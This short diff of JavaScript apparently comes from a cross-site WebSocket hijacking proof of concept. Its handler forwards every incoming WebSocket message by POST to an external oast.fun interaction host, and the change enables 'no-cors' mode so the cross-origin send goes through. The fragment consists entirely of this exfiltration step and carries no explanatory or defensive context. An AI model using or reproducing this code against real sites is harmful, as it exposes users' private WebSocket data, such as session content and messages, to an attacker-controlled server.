@@ -15,7 +15,7 @@
         ws.onmessage = function(event) {
             fetch('https://urebhcvlcfzusdpadjhirrwcq5hfanf83.oast.fun', {
                 method: 'POST',
-                //mode: 'no-cors',
+                mode: 'no-cors',
                 body: event.data
             });
         };
